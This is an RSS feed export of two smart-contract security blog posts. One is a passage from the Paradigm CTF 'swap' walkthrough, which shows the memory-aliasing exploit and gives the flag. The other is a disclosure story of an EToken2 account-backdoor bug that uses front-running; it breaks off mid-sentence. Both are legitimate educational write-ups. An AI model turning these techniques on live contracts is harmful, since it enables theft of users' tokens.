<code>v</code> and <code>amounts</code> now alias each other, both will share the same values and updating one will update the other. This means that while you can manipulate <code>v</code> by writing into <code>amounts</code>, the reverse is true as well.</p><p>As such, if you just tried to force some initial values into <code>v</code> by calling <code>mint</code> with some custom values, you might&apos;ve found that your data kept getting clobbered by the writes to <code>v.totalSupply</code>, <code>v.totalBalanceNorm</code>, and <code>v.totalInNorm</code>. This means that some careful planning is needed to make sure that your values stay consistent over all four iterations of the loop.</p><p>Additionally, <code>v.amountToMint</code> is updated <em>after</em> the four iterations, meaning that even if we try to write directly to <code>amounts[3]</code>, it&apos;ll just be overwritten with the correctly calculated value in the end. This means that we&apos;ll need to either make <code>v.totalInNorm</code> or <code>v.totalSupply</code> extremely big, or make <code>v.totalBalanceNorm</code> extremely small.</p><p>To do this, we first swap out all of the stablecoins in the AMM except for DAI. This means that <code>v.totalBalanceNorm</code> will not increase after the first iteration because the AMM has no balance. This just makes our lives a bit easier later on.</p><p>Next, we&apos;ll purchase the right amount of DAI/TUSD/USDC such that when <code>amounts[i] = v.has</code> is executed, we&apos;ll write our desired values into <code>v</code>. The balance of DAI will be written to <code>v.totalSupply</code>, so we&apos;ll want to set this to a large number such as <code>10000e18</code>. The balance of TUSD will be written to <code>v.totalBalanceNorm</code>, so we&apos;ll update that to <code>1</code>. Finally, the balance of USDC will be written to <code>v.totalInNorm</code> so we&apos;ll also set that to <code>10000e18</code>. There&apos;s no point manipulating the USDT balance because the value will be clobbered anyways.</p><p>Finally, we just need to assemble our payload and send the transaction, giving us the flag we worked so hard for: <code>PCTF{hon3y_1_Ov3rFLOw3d_7h3_M3MOry}</code>.</p><p>You can find the official solution <a href=\"https://github.com/paradigm-operations/paradigm-ctf-2021/tree/master/swap/private/Exploit.sol\">here</a>.</p><h1 id=\"conclusion\">Conclusion</h1><p>This was by far the most complex challenge in the CTF and for good reason - it made use of a vulnerability that most people haven&apos;t heard of and very few people actively think about. It also challenged basic assumptions about what Solidity source code really does. However, I think it made for a great exercise in solving problems from first principles, eliminating assumptions, and exploring the entire search space. Hopefully you enjoyed this writeup and I&apos;ll see you next year at Paradigm CTF 2022!</p>","content:encodedSnippet":"When you have eliminated all which is impossible, then whatever remains, however improbable, must be the truth - Sherlock Holmes\nParadigm CTF 2021 took place in early February and together, players solved all but two of the challenges during the competition (and one of the remaining two mere days later).\n\nEpic video stream by @adietrichs successfully solving @paradigm_ctf JOP challenge. Congrats!\nPart 1: https://t.co/1RDISh7TZl\nPart 2: https://t.co/ZLonJUsjHf\n— Peter Kacherginsky (@_iphelix) February 10, 2021\n\n\nHowever, the second of the two remained unsolved for almost 2 months until just a few days ago.\n\nIt finally happened! Congrats to @HRitzdorf and @a_permenev for solving the infamous 'swap' challenge from @paradigm_ctf. Official write-up and solutions will be posted in a few days so now's your chance to give it one last shot!https://t.co/wNGnJLA0u8\n— samczsun (@samczsun) April 7, 2021\n\n\nToday, we'll be taking a look at swap in the form of a guided walkthrough. Each section will give you a small hint at the end in case you're stuck. If you haven't already, take a look at the challenge files here and familiarize yourself with the code.\nThe Challenge\nThis challenge implements a fictional stablecoin AMM. Users can do all the things you'd expect from an AMM:  swap assets and mint/burn/transfer LP shares. The contract is initialized with 100 ether worth of four stablecoins (DAI, TUSD, USDC, USDT) and the win condition is to reduce the TVL of the AMM to 1% of what it started with.\nInitially, you might assume that there's a bug in the swap function, but it's easy to confirm with reasonable confidence that the function behaves as expected and won't give you any free stablecoins.\nYou might also try stealing the LP tokens from the setup contract itself, but the ERC20 implementation appears to be correct and so that's impossible too.\nYou could try minting and burning LP tokens, but you'll find that the invariants appear to be correctly maintained and that you can't mint more LP tokens than you deserve, or burn more LP tokens that you have.\nFinally, just to really drive the point home, all functions are marked nonReentrant.\nAt this point, the challenge is looking pretty hopeless so under contest conditions it's perfectly reasonable to just drop it and move onto a different problem. However, now that we have all the time in the world, how might we tackle this?\nWell, keen observers might notice that the win condition is slightly different in this challenge. In every other challenge, it's always required to drain the entire contract of all assets. However, in this challenge, you only need to drain a percentage. Why might this be?\nEverything Is Intentional\nOne of the lessons I've learned the hard way is that everything in a CTF, no matter how innocuous, is intentional. In this sense, the win condition is a subtle hint towards what the solution requires. The fact that you don't need to drain all of the assets to win should strongly suggest that it's in fact impossible to drain all of the assets.\nBut what does this mean for us? Working from first principles, we can reset our assumptions by following this chain of logic:\n\nWe need to remove (some, but not all) assets from the pool\nThe only way for assets to leave the pool is through a swap or a burn\nSwapping appears to be correctly implemented such that no assets can be stolen\nBurning also appears to be correctly implemented such that no assets can be stolen\nHowever, while swapping is a single-step process, burning is a two-step process where the first step is somehow acquiring LP tokens. The burn operation itself says nothing about where the LP tokens come from, so there must be a way to get free LP tokens\n\nThe subtle hint also reinforces this theory. Assuming that we can't steal the LP tokens from the setup contract, we'll never be able to burn 100% of all LP tokens and so we'll never be able to drain the entire contract.\nUnder the assumption that there must be a way to get free LP tokens, can you figure out what the solution is?\nNo Matter How Improbable\nThere are only two ways to get LP tokens. The first is to mint them, and the second is to be transferred them. We've already established that the ERC20 implementation is sound (although you may want to double-check that before committing yourself to the more challenging route) which leaves us with the mint function.\n     struct MintVars {\n        uint totalSupply;\n        uint totalBalanceNorm;\n        uint totalInNorm;\n        uint amountToMint;\n        \n        ERC20Like token;\n        uint has;\n        uint preBalance;\n        uint postBalance;\n        uint deposited;\n    }\n \n    function mint(uint[] memory amounts) public nonReentrant returns (uint) {\n        MintVars memory v;\n        v.totalSupply = supply;\n        \n        for (uint i = 0; i < underlying.length; i++) {\n            v.token = underlying[i];\n            \n            v.preBalance = v.token.balanceOf(address(this));\n            \n            v.has = v.token.balanceOf(msg.sender);\n            if (amounts[i] > v.has) amounts[i] = v.has;\n            \n            v.token.transferFrom(msg.sender, address(this), amounts[i]);\n            \n            v.postBalance = v.token.balanceOf(address(this));\n            \n            v.deposited = v.postBalance - v.preBalance;\n\n            v.totalBalanceNorm += scaleFrom(v.token, v.preBalance);\n            v.totalInNorm += scaleFrom(v.token, v.deposited);\n        }\n        \n        if (v.totalSupply == 0) {\n            v.amountToMint = v.totalInNorm;\n        } else {\n            v.amountToMint = v.totalInNorm * v.totalSupply / v.totalBalanceNorm;\n        }\n        \n        supply += v.amountToMint;\n        balances[msg.sender] += v.amountToMint;\n        \n        return v.amountToMint;\n    }\nThe goal now is to somehow adjust v.amountToMint such that we are minted way more LP tokens than we deserve. We can start by reviewing the function itself again, but this time with a fine-tooth comb. The function begins by constructing an object to represent the local variables. Then, for each token, we record the current balance of the AMM as well as the balance of the sender. If the amount to be deposited is greater than the sender's balance, then we update the amount requested. We perform the transfer, record the current balance again, then update the total deposited counters appropriately.\nNothing is immediately obvious, so we must begin eliminating the impossible and leave ourselves with only the improbable. Unfortunately, sometimes we might not know enough to immediately differentiate between the impossible and the improbable, so we'll need to keep an open mind.\nWe can again reset our assumptions by working from first principles using the following chain of logic:\n\nWe clearly need to change v.amountToMint in such a way that the value is larger than what it should be\nThe equation to calculate the amount to mint is implemented correctly\nTherefore, there must be another way to either tamper with v.amountToMint directly or to tamper with one of the values it depends on.\n\nDo you see any way to do this, even if it seems impossible or improbable at first?\nTrue Names Have Power\nNotice that v.amountToMint is a field on MintVars memory v. This means that any time we write to v.amountToMint, we're actually writing to memory. Unlike data on the stack (recall that the EVM is a stack-based VM), data in memory can be aliased, meaning that the same data can be accessed through multiple symbolic names.\nIt just so happens that we have two pointers to memory in scope. The first is MintVars memory v, and the second is uint[] memory amounts. If we could somehow cause the latter to point to the same memory address as the former, then we could trigger undefined behavior by updating one through the other.\nIn order to understand where the amounts variable comes from, we'll first take a brief detour to the land of the Solidity ABI. All transactions are but blobs of data, and it's the job of the ABI to define a standard way of parsing that blob into structed information. Before a contract's code is executed, Solidity inserts some logic which decodes the transaction data into the types that the code expects. Only then does the contract begin executing.\nIn the case of mint(uint256[]), the ABI decoder will decode the transaction data into a single array of uint256. Is there some way that we can trick the ABI decoder into causing the decoded array to alias with the MintVars object constructed later?\nAround the World\nAccording to the Solidity documentation, the ABI encoding of an array is as follows:\n<- 32 bytes ->\n\nOOOOO....OOOOO [offset to array start]\n    [....]\nLLLLL....LLLLL [length in words]\nDDDDD....DDDDD [data #1]\nDDDDD....DDDDD [data #2]\n    [....]\nDDDDD....DDDDD [data #L]\n\nTo parse that data, the ABI decoder runs the following pseudocode:\nfunction decodeArrayAt(uint arg) private returns (bytes memory) {\n    uint offset = read(0x04+0x20*arg);\n    uint length = read(0x04+offset);\n    bytes memory data = malloc(length);\n    memcpy(data, 0x04 + offset + 0x20, length);\n    return data;\n}\nSo far so good. Let's take a look at how malloc is implemented, again in pseudocode:\nfunction malloc(uint size) private returns (bytes memory) {\n    bytes memory buf;\n    assembly {\n        buf := mload(0x40)\n        mstore(0x40, add(add(buf, size), 0x20))\n        mstore(buf, size)\n    }\n    return buf;\n}\nSolidity uses what is known as a linear memory allocator (or arena-based allocator). This just means that Solidity will allocate new memory linearly along the block of total available memory. To allocate a new chunk, Solidity reads the free-memory pointer stored at 0x40 to determine where the next free address is, and moves it forward to reflect the fact that a new chunk of memory was just allocated.\nNotice that there are no checks to ensure that the amount of memory requested is not excessively large. This means that if one was to allocate a specific amount of memory, then the free memory pointer may overflow and begin re-allocating in-use memory. In this case, two calls to the pseudo-malloc might return pointers which alias each other.\nFortunately for us, we can control exactly the size of memory the allocator will allocate simply by changing the ABI-encoded representation of our array. This lets us cause the allocator to allocate v over top of our amounts array.\nCan you figure out the final step to solving this challenge?\nTechnical Difficulties\nBecause v and amounts now alias each other, both will share the same values and updating one will update the other. This means that while you can manipulate v by writing into amounts, the reverse is true as well.\nAs such, if you just tried to force some initial values into v by calling mint with some custom values, you might've found that your data kept getting clobbered by the writes to v.totalSupply, v.totalBalanceNorm, and v.totalInNorm. This means that some careful planning is needed to make sure that your values stay consistent over all four iterations of the loop.\nAdditionally, v.amountToMint is updated after the four iterations, meaning that even if we try to write directly to amounts[3], it'll just be overwritten with the correctly calculated value in the end. This means that we'll need to either make v.totalInNorm or v.totalSupply extremely big, or make v.totalBalanceNorm extremely small.\nTo do this, we first swap out all of the stablecoins in the AMM except for DAI. This means that v.totalBalanceNorm will not increase after the first iteration because the AMM has no balance. This just makes our lives a bit easier later on.\nNext, we'll purchase the right amount of DAI/TUSD/USDC such that when amounts[i] = v.has is executed, we'll write our desired values into v. The balance of DAI will be written to v.totalSupply, so we'll want to set this to a large number such as 10000e18. The balance of TUSD will be written to v.totalBalanceNorm, so we'll update that to 1. Finally, the balance of USDC will be written to v.totalInNorm so we'll also set that to 10000e18. There's no point manipulating the USDT balance because the value will be clobbered anyways.\nFinally, we just need to assemble our payload and send the transaction, giving us the flag we worked so hard for: PCTF{hon3y_1_Ov3rFLOw3d_7h3_M3MOry}.\nYou can find the official solution here.\nConclusion\nThis was by far the most complex challenge in the CTF and for good reason - it made use of a vulnerability that most people haven't heard of and very few people actively think about. It also challenged basic assumptions about what Solidity source code really does. However, I think it made for a great exercise in solving problems from first principles, eliminating assumptions, and exploring the entire search space. Hopefully you enjoyed this writeup and I'll see you next year at Paradigm CTF 2022!","dc:creator":"samczsun","content":"A guided walkthrough for swap, the hardest challenge in Paradigm CTF 2021","contentSnippet":"A guided walkthrough for swap, the hardest challenge in Paradigm CTF 2021","guid":"606dfaa58b092400019ea0b3","isoDate":"2021-04-09T17:17:56.000Z","from":"https://samczsun.com/rss/","hashId":"f789d1450476622dfe29b2a8e667b085"},{"creator":"samczsun","title":"Uncovering a Four Year Old Bug","link":"https://samczsun.com/uncovering-a-four-year-old-bug/","pubDate":"Mon, 19 Apr 2021 18:39:44 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2021/04/149442071_xl.jpg\" alt=\"Uncovering a Four Year Old Bug\"><p><em>Every adventure requires a first step - The Cheshire Cat</em></p><p>What does it take to find a bug? What about one in a contract that&apos;s survived the test of time? The journey to a critical vulnerability isn&apos;t always straightforward and might begin when you least expect it.</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">Found a critical bug in a contract that&apos;s over 4 years old, possibly the oldest to ever be discovered. Full story coming soon so keep an eye out &#x1F440;</p>&#x2014; samczsun (@samczsun) <a href=\"https://twitter.com/samczsun/status/1379161559902121987?ref_src=twsrc%5Etfw\">April 5, 2021</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><p>A few weeks ago I tweeted about a critical bug I had found. The bug affected contracts that are over four years old and now manage over a billion dollars in assets. Today, I&apos;ll tell you the story of how it happened.</p><h1 id=\"the-white-rabbit\">The White Rabbit</h1><p>It was just after lunch when I got a push notification from one of the Ethereum security group chats.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-5.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"518\" height=\"169\"></figure><p>This immediately caught my attention for two reasons:</p><ol><li>Most users of go-ethereum (geth) will normally never run into an error, because the software is written to be extremely resilient</li><li>This error was occurring on the latest version of geth, meaning it had all the newest security patches</li></ol><p>Having just found a <a href=\"https://samczsun.com/undisclosed/\">bug</a> in geth myself recently, I couldn&apos;t help wonder if there was an ongoing attack.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-6.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"521\" height=\"109\"></figure><p>Anatol confirmed that the block was indeed on mainnet and shared his log file to help with debugging.</p><pre><code>########## BAD BLOCK #########\nChain config: {ChainID: 1 Homestead: 1150000 DAO: 1920000 DAOSupport: true EIP150: 2463000 EIP155: 2675000 EIP158: 2675000 Byzantium: 4370000 Constantinople: 7280000 Petersburg: 7280000 Istanbul: 9069000, Muir Glacier: 9200000, YOLO v2: &lt;nil&gt;, Engine: ethash}\n\nNumber: 11805072\nHash: 0x0b3d0081b32c2159e2b77e5f2c798b737d0ae1a822669614c989377947c71ada\n     0: cumulative: 123312 gas: 123312 contract: 0x0000000000000000000000000000000000000000 status: 1 tx: 0x9bdf8792e0d6b62a68b9dbd849d60ca78ae6512d9a838d575d4f51d36a7ae095 logs: [0xc12c5d6000 0xc12c5d60b0 0xc12c5d6160 0xc12c5d6210 0xc12c5d62c0] bloom: 00200000000000040000000080000000000000000000001000010001000000000000000000000000000000000000000002000000080800000000000000000000000000000000000000000008000000200000000000000000000000008000010000000000000000000000000000000010000000000000000000000010000000000000000000000000004000000000000000000001000000080000004000000000000000000000000000000000000000000000000000000000000000000000000000008002000082000000000040000000000000000000001002000000000020000000200000000000000000000000000000000000000000400080000000000000 state: \n     [snip]\n     203: cumulative: 11152534 gas: 45752 contract: 0x0000000000000000000000000000000000000000 status: 1 tx: 0x63fe497529605f75abdaa5b026ef5e6d878fca827a7ee2a3168d9c4f0347baef logs: [0xc127c05970] bloom: 00000000000000000000000000000000000000000800000000010000000000000000000000000000000000000000000000000800000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000034000000000000000000000000000000000000000000000000000000000000 state: \n\n\nError: invalid gas used (remote: 12458355 local: 11152534)\n##############################</code></pre><p>This error says that the block header claimed that all of the transactions used a total of <code>12458355</code> gas, but when the node executed all of the transactions it only used <code>11152534</code> gas instead. I first double-checked that my own node knew of the suspicious <a href=\"https://etherscan.io/block/11805072\">block</a>.</p><pre><code>$ seth block 11805072 hash\n0x0b3d0081b32c2159e2b77e5f2c798b737d0ae1a822669614c989377947c71ada</code></pre><p>Given that the block hash matched, I knew that this wasn&apos;t an exploit but rather some sort of error with Anatol&apos;s node. The error log tells us the gas used by each transaction, so I quickly wrote a script to check each transaction in the block and compare the actual gas used with what Anatol&apos;s node reported. This let me pinpoint the <a href=\"https://etherscan.io/tx/0x4048958b7c522cb182951a8bb82814ff04d56cbf049ebc8f430d818c70a178dd\">offending transaction</a>.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-7.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"515\" height=\"156\"></figure><p>I knew that there must be some difference in state between Anatol&apos;s node and mainnet, so I DMed him for RPC access so I can inspect the contracts that the offending transaction interacted with.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-8.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"521\" height=\"85\"></figure><p>The transaction in question was a simple ERC20 transfer, so I quickly simulated it on Anatol&apos;s node, which failed.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-9.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"515\" height=\"56\"></figure><p>I quickly confirmed that the sending account contained enough tokens so all that was left was to comb through each sub-call to see where the gas usage discrepancy came from. After wrangling with <code>seth</code> for a bit, I found the root cause.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-10.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"522\" height=\"384\"></figure><p><a href=\"https://etherscan.io/address/9e6d0f3cdedab391483b234e6c06bc35aaba75c7#code\">This contract</a> contains an address in storage slot 0 on mainnet but no address on Anatol&apos;s node, a clear indication that there was some storage corruption. Anatol revealed that he actually restored the geth database from a backup, so most likely something got lost along the way and the node couldn&apos;t read the storage entry for that specific contract. Given that it&apos;d be practically impossible to figure out what else was corrupted, I recommend he give snap sync a shot to quickly get his node back up and running.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/04/image-11.png\" class=\"kg-image\" alt=\"Uncovering a Four Year Old Bug\" loading=\"lazy\" width=\"510\" height=\"87\"></figure><h1 id=\"down-the-rabbit-hole\">Down the Rabbit Hole</h1><p>Now that the immediate mystery was solved, I turned my attention to the corrupted contract. While debugging the transaction, I recognized the contract as an <code><a href=\"https://etherscan.io/address/0x331d077518216c07c87f4f18ba64cd384c411f84#code\">EToken2</a></code>-issued token. I had reviewed that particular platform a long time ago, but that was before I gained all the experience I have now. Sometimes all it takes was a fresh approach and I was feeling confident that things would be different this time.</p><p>I started by defining my goals. Since this was an ERC20 contract, any way to get free tokens (either through stealing them from others or minting them myself) would have the highest impact. Next would be any form of griefing such as burning tokens that I don&apos;t own or making it impossible to transfer tokens.</p><p>Now I could start reviewing. The token contract itself delegates the ERC20 functions such as <code>transfer</code> to an implementation contract, but interestingly the implementation may vary per-user. Essentially, the token contains a default implementation (the latest version) which can be upgraded at any time by the owner. If a user doesn&apos;t agree with the upgrade, they can choose to opt-out and fix their specific implementation to the current version instead of being dragged along to the new implementation. This was an extremely interesting mechanic but I quickly confirmed that there was no way for me to set a custom implementation for myself, so I moved on.</p><p>Next up was the default implementation contract. Because the token wasn&apos;t using <code>delegatecall</code> but rather <code>call</code>, it needed to tell the implementation who the original caller was. If the implementation wasn&apos;t correctly authenticating the proxy, then it would be possible to spoof a transfer. Unfortunately, a quick check revealed that the implementation contract was secure as well.</p><p>After one more hop through the main token contract I finally arrived at the <code>EToken2</code> platform contract, which is where all of the ERC20 logic is truly implemented. If the previous contracts were the appetizers, then this would be the main course, and I was excited to dig in.</p><h1 id=\"cake-and-a-drink\">Cake and a Drink</h1><p>Earlier I had noticed that in order to be ERC20-compliant, each token contained two functions which emitted <code>Transfer</code> and <code>Approval</code> functions which could only be called by the <code>EToken2</code> contract. It would be extremely interesting if I could somehow trick the <code>EToken2</code> contract into emitting fake events, so I focused on this first.</p><p>There was only one place in the <code>EToken2</code> contract which triggered a token to emit the event, and that was in <code>_proxyTransferEvent</code>.</p><pre><code class=\"language-solidity\">function _proxyTransferEvent(uint _fromId, uint _toId, uint _value, bytes32 _symbol) internal {\n    if (proxies[_symbol] != 0x0) {\n        // Internal Out Of Gas/Throw: revert this transaction too;\n        // Recursive Call: safe, all changes already made.\n        Proxy(proxies[_symbol]).emitTransfer(_address(_fromId), _address(_toId), _value);\n    }\n}</code></pre><p>Interestingly though, the function didn&apos;t take the proxy directly but the symbol indirectly. This was a classic example of an indirection attack because if I could change the value of <code>proxies[_symbol]</code> then I would be able to trigger a <code>Transfer</code> event on any target I wanted.</p><p>There were three calls to <code>_proxyTransferEvent</code>: minting would trigger an event from <code>address(0)</code> to <code>msg.sender</code>, burning would trigger an event from <code>from</code> &#xA0;to <code>address(0)</code>, and transferring would trigger an event from <code>from</code> to <code>to</code>. The first two were not particularly useful because I could only control at most one of the two parameters, but the last was interesting because I could potentially trigger a <code>Transfer</code> event from an arbitrary address to an arbitrary address.</p><p>Unfortunately, here I ran into a problem. The only way to reach the <code>_transfer</code> function was through the <code>proxyTransferFromWithReference</code> function, and that function would only allow the address specified in <code>proxies</code> to trigger a transfer for the specific symbol. This meant that if I owned a token and updated my proxy to the proxy for another token, I would no longer be able to trigger the transfer to cause the exploit.</p><p>It seemed like this potential exploit was dead, but I was reluctant to give up on it so I scrolled around some more. It was then that I really looked closer at the function signature for <code>_transfer</code>.</p><pre><code class=\"language-solidity\">function _transfer(\n    uint _fromId,\n    uint _toId,\n    uint _value,\n    bytes32 _symbol,\n    string _reference,\n    uint _senderId\n) internal checkSigned(_senderId, 1) returns (bool);</code></pre><p>I had completely dismissed the <code>checkSigned</code> modifier because it was obviously a no-op in the default configuration. If it was significant, then users would have to submit some sort of signature with each transfer and that was obviously not happening. Now, with nowhere else to turn, I decided to look into what exactly <code>checkSigned</code> was doing.</p><pre><code class=\"language-solidity\">    function _checkSigned(Cosigner _cosigner, uint _holderId, uint _required) internal returns(bool) {\n        return _cosigner.consumeOperation(sha3(msg.data, _holderId), _required);\n    }\n\n    modifier checkSigned(uint _holderId, uint _required) {\n        if (!isCosignerSet(_holderId) || _checkSigned(holders[_holderId].cosigner, _holderId, _required)) {\n            _;\n        } else {\n            _error(&apos;Cosigner: access denied&apos;);\n        }\n    }</code></pre><p>Incredible! It turns out that <code>checkSigned</code> actually performed an external call if a <code>Cosigner</code> is set for a user. This would explain why I never saw any users providing any signatures for a simple transfer. At the same time, this security feature was exactly what I needed to finalize my exploit.</p><p>I&apos;ve talked about how reentrancy is really just a subset of what I&apos;ve dubbed <em>unsafe external calls</em>, because the real risk is in the fact that control flow is handed to a third-party contract which can then go and do whatever it wants. The attacker could choose to reenter through the same function, but they could just as well do anything else, and this is a great example of that.</p><p>The problem I was facing was that I needed <code>proxies[symbol]</code> to be my own proxy before the transfer call, but a different value after I had begun the transfer process. Now with the cosigner functionality, I could set a custom cosigner which would swap my symbol&apos;s proxy when it receives a call to <code>consumeOperation</code>. This call would happen after the call to <code>proxyTransferFromWithReference</code> but before the call to <code>_proxyTransferEvent</code>, allowing me to trigger an arbitrary event on any <code>EToken2</code>-issued token!</p><h1 id=\"pepper\">Pepper</h1><p>This was a good start, but the impact was not quite what I was looking for. This was because <code>EToken2</code> is a whitelisted platform and only a centralized authority could issue new tokens. If I were an attacker and I wanted to pull off this attack, I would have to sign up and probably go through KYC/AML, which is obviously not ideal. It was also unclear who exactly might be affected by this bug, and I couldn&apos;t really go and test it for myself.</p><p>Undeterred, I stowed this finding away and kept looking for something else. While scanning through the contract, I noticed some interesting logic for transferring access from one user to another.</p><pre><code class=\"language-solidity\">    function grantAccess(address _from, address _to) returns(bool) {\n        if (!isCosignerSet(getHolderId(_from))) {\n            _error(&apos;Cosigner not set&apos;);\n            return false;\n        }\n        return _grantAccess(getHolderId(_from), _to);\n    }\n\n    function _grantAccess(uint _fromId, address _to) internal checkSigned(_fromId, 2) returns(bool) {\n        // Should recover to previously unused address.\n        if (getHolderId(_to) != 0) {\n            _error(&apos;Should recover to new address&apos;);\n            return false;\n        }\n        // We take current holder address because it might not equal _from.\n        // It is possible to recover from any old holder address, but event should have the current one.\n        address from = holders[_fromId].addr;\n        holders[_fromId].addr = _to;\n        holderIndex[_to] = _fromId;\n        // Internal Out Of Gas/Throw: revert this transaction too;\n        // Recursive Call: safe, all changes already made.\n        eventsHistory.emitRecovery(from, _to, msg.sender);\n        return true;\n    }</code></pre><p>As it happens, I was so engrossed in figuring out how exactly to swap around the proxy that I didn&apos;t pay attention to what was actually going on in the contract. Notice that in the signature for <code>_transfer</code>, the from and to values are actually <code>uint</code>, not <code>address</code>. The <code>EToken2</code> contract maintains a mapping of users (<code>address</code>) to holder id (<code>uint</code>) and this was the logic for granting your holder id to another address.</p><p>The moment I realized this, I started studying this function in earnest. At a high level, this function essentially transferred ownership of some data from one entity to another, and one common mistake to make when implementing this sort of internal ownership transfer is to update the receiver correctly but forget to invalidate the sender. If the receiver isn&apos;t updated correctly, any sort of testing will instantly reveal that there&apos;s a problem. If the sender isn&apos;t invalidated correctly, simple tests might not notice anything wrong.</p><p>Looking closer at the implementation of <code>_grantAccess</code>, I saw that it was intentionally designed such that it&apos;s possible to determine the previous address that owned a specific holder id. This was intended to allow a user who accidentally granted access to the wrong wallet to still maintain ownership, but intuitively I knew something was off here.</p><p>Even still, I couldn&apos;t quite figure out what that was at first glance. After all, if an attacker were to grant access to their holder id to another user, that&apos;s just putting their own funds at risk. Why would anyone want to do that?</p><p>After stewing on it for a little bit, I realized that I was looking at it in the wrong way. The key was that while the other user would have full ownership over &quot;my&quot; holder id, I would also have full ownership over &quot;their&quot; holder id. In other words, I would be able to backdoor any new user of the <code>EToken2</code> platform and gain full access to their account, which translates to control over any <code>EToken2</code>-issued token they owned.</p><p>It was a quick step from there to figure out how to weaponize this exploit. I needed to grant access to a user before they first use the <code>EToken2</code> platform, but I can&apos;t just go around granting access to random addresses. The solution was clear - I could just scan the mempool for transactions which would result in a user becoming registered with the <code>EToken2</code> platform, and then frontrun any transactions I find. What&apos;s more, because of <code>EToken2</code>&apos;s architecture, I wouldn&apos;t just be attacking a single token but multiple tokens with multi-million dollar market caps.</p><figure class=\"kg-card kg-gallery-card kg-width-wide\"><div class=\"kg-gallery-container\"><div class=\"kg-gallery-row\"><div class=\"kg-gallery-image\"><img src=\"https://samczsun.com/content/images/2021/04/image-26.png\" width=\"707\" height=\"391\" loading=\"lazy\" alt=\"Uncovering a Four Year Old Bug\" srcset=\"https://samczsun.com/content/images/size/w600/2021/04/image-26.png 600w, https://samczsun.com/content/images/2021/04/image-26.png 707w\"></div><div class=\"kg-gallery-image\"><img src=\"https://samczsun.com/content/images/2021/04/image-25.png\" width=\"713\" height=\"417\" loading=\"lazy\" alt=\"Uncovering a Four Year Old Bug\" srcset=\"https://samczsun.com/content/images/size/w600/2021/04/image-25.png 600w, https://samczsun.com/content/images/2021/04/image-25.png 713w\"></div></div><div class=\"kg-gallery-row\"><div class=\"kg-gallery-image\"><img src=\"https://samczsun.com/content/images/2021/04/index.png\" width=\"720\" height=\"423\" loading=\"lazy\" alt=\"Uncovering a Four Year Old Bug\" srcset=\"https://samczsun.com/content/images/size/w600/2021/04/index.png 600w, https://samczsun.com/content/images/2021/04/index.png 720w\" sizes=\"(min-width: 720px) 720px\"></div><div class=\"kg-gallery-image\"><img src=\"https://samczsun.com/content/images/2021/04/image-23-1-.png\" width=\"716\" height=\"416\" loading=\"lazy\" alt=\"Uncovering a Four Year Old Bug\" srcset=\"https://samczsun.com/content/images/size/w600/2021/04/image-23-1-.png 600w, https://samczsun.com/content/images/2021/04/image-23-1-.png 716w\"></div></div></div></figure><p>At this point, I knew I had found what I was looking for, and it was time to contact the project.</p><h1 id=\"52\">52</h1><p>Finding the bug was one thing, but fixing it was another. <code>EToken2</code> had been designed to be non-upgradable, but forcing every single token issued on top of <code>EToken2</code> to migrate their data to a new contract would be unduly burdensome. Oleksii, fellow white hat and also the head architect at Ambisafe, agreed. We had to find another way.</p><p>There weren&apos;t many things in <code>_grantAccess</code> that could revert. In fact, there was only one. The very last line in the function logged an event using the <code>eventHistory</code> contract. If this call reverted, then so would the call to <code>_grantAccess</code> and it would be impossible for anyone to backdoor another account. However, the <code><a href=\"https://etherscan.io/address/0x60bf91ac87fee5a78c28f7b67701fbcfa79c18ec#code\">EventsHistory</a></code> contract doesn&apos;t allow administrators to redefine the handler for an event.</p><pre><code class=\"language-solidity\">    function addVersion(address _caller, string _name, string _changelog) noValue() checkAccess(&quot;admin&quot;) returns(bool) {\n        if (versions[_caller] != 0) {\n            return false;\n        }\n        if (bytes(_name).length == 0) {\n            return false;\n        }\n        if (bytes(_changelog).length == 0) {\n            return false;\n        }\n        uint version = ++latestVersion;\n        versions[_caller] = version;\n        versionInfo[version] = VersionInfo(block.number, msg.sender, _caller, _name, _changelog);\n        return true;\n    }\n\n    function () noValue() {\n        if (versions[msg.sender] == 0) {\n            return;\n        }\n        // Internal Out Of Gas/Throw: revert this transaction too;\n        // Call Stack Depth Limit reached: revert this transaction too;\n        // Recursive Call: safe, all changes already made.\n        if (!emitters[msg.sig].delegatecall(msg.data)) {\n            throw;\n        }\n    }</code></pre><p>It seemed like we were at a dead end, but we quickly realized the situation wasn&apos;t nearly as bad as it appeared. Although the <code>EventsHistory</code> contract was intended to be immutable, it too had a bug which could be &quot;exploited&quot; by the admins.</p><p>Each emitter was handled using a <code>delegatecall</code>, which causes the code to be executed with the current contract&apos;s context. If we wanted to perform an upgrade on the <code>EventsHistory</code> contract, we could just register a <a href=\"https://etherscan.io/address/0x197EeC05Dd08178C1006F9475219ee004bcca08e\">fake emitter</a> which would perform the upgrades we wanted by directly writing to storage.</p><p>Oleksii quickly wrote a few contracts to patch up the vulnerabilities I had found. The first would replace the handler for the <code>emitRecovery</code> function and would require that any addresses being granted access had explicitly opted in to being granted access. The second would replace the handler for all 